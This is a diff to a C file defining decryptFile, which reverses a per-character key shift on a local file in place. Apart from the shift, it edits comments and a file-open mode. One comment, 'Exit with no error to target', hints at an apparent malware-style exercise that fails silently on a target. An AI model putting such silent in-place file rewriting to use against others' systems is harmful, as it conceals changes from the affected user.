@@ -6,7 +6,7 @@
 *																				 							*
 * Called from: main.c										 					 					*
 *																				 							*
-* Function to decrypt the file XtoM.c											            *
+* Function to decrypt the file MtoX.c											            *
 **********************************************************************************/
 
 /*********************************************************************************
@@ -17,9 +17,9 @@ void decryptFile(int key) {
 	char ch;
 
 	// Open the file XtoMCopy.c to encrypt
-	fp = fopen("trashToEncrypt.c","rb+");
+	fp = fopen("trashToEncrypt.c","r+");
 
-	// Read in the file 1 character at a time and print 
+	// Read in the file 1 character at a time and print the value changed by key
 	if (fp == NULL){
 		//printf("Cannot open file \n");
 		exit(0); // Exit with no error to target
@@ -29,5 +29,6 @@ void decryptFile(int key) {
 		fseek(fp, ftell(fp) - 1, SEEK_SET);
 		fprintf(fp, "%c", ch-key);
 	}
+
 	fclose(fp);
 }
